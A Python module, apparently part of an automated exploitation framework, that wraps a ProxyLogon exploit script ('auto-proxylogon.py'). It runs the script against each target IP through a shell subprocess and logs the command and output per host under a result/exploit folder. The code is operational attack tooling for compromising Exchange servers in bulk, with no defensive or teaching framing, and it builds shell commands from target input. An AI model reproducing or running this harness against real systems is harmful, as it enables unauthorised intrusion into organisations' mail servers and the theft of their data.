
# -*- coding: utf-8 -*-
import re
import os
import json
import asyncio
import aiofiles
import random
import string
from pathlib import Path
from urllib.parse import urlparse
import logging

from aiohttp.helpers import parse_mimetype

GLOBAL_ID = ''.join(random.choice(string.ascii_letters) for _ in range(6))


class BASE(object):
    def __init__(self):
        self.description = None
        self.id = ''.join(random.choice(string.ascii_letters)
                          for _ in range(6))
        self.logger = logging.getLogger(self.get_name() + '_' + self.id)
        self.script = None
        self.command = None

    async def __aenter__(self):
        pass

    async def __aexit__(self, *args):
        pass

    def __await__(self):
        return self.__aenter__().__await__()

    def get_name(self):
        return Path(__file__).stem

    def get_description(self):
        return self.description

    def get_id(self):
        return self.id

    def get_python(self, script, command):
        python = os.path.dirname(os.path.abspath(
            __file__)) + '\\bin\\venv\\Scripts\\python.exe'
        return [python] + [script] + command

    def get_command(self, command):
        cmd = self.get_python(self.get_script(), command)
        return ' '.join('"%s"' % i for i in cmd)

    def add_command(self, command, params):
        for key,value in params.items():
            command = command + [key] + [value]
        return command

    def format_command(self, command, cformat):
        return [i.format(**cformat) for i in command]

    def get_script(self):
        return os.path.dirname(os.path.abspath(__file__)) + '\\bin\\' + (self.script or self.get_name() + '.py')

    async def save(self, data, name=''):
        path = os.path.join(os.getcwd(), 'result',
                            'exploit',GLOBAL_ID)
        Path(path).mkdir(parents=True, exist_ok=True)
        path = os.path.join(path,self.get_name() + '_' + name + '.txt')
        async with aiofiles.open(path, mode='a+',encoding="utf-8") as f:
            await f.write('{}\n'.format(data))


class EXPLOIT(BASE):
    def __init__(self):
        super(EXPLOIT, self).__init__()
        self.description = 'proxylogon exploit | author: github.com/Udyz | twitter.com/lotusdll'
        self.script = 'auto-proxylogon.py'
        self.command = ['{ip}']

    async def run(self, ipaddr, **kwargs):
        try:

            url = urlparse('//' + ipaddr)
            command = self.format_command(
                self.command, {'ip': url.hostname})
            cmd = self.get_command(command)

            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await proc.communicate()
            await self.save(f'[{self.script!r} exited with {proc.returncode}]\n', url.hostname)
            await self.save(f'[cmd]\n{cmd}\n', url.hostname)
            if stdout:
                
                await self.save(f'[stdout]\n{stdout.decode(encoding="utf-8")}\n', url.hostname)
            if stderr:
                
                await self.save(f'[stderr]\n{stderr.decode(encoding="utf-8")}\n', url.hostname)
            return True
        except Exception as e:
            self.logger.exception(e)
            # pass
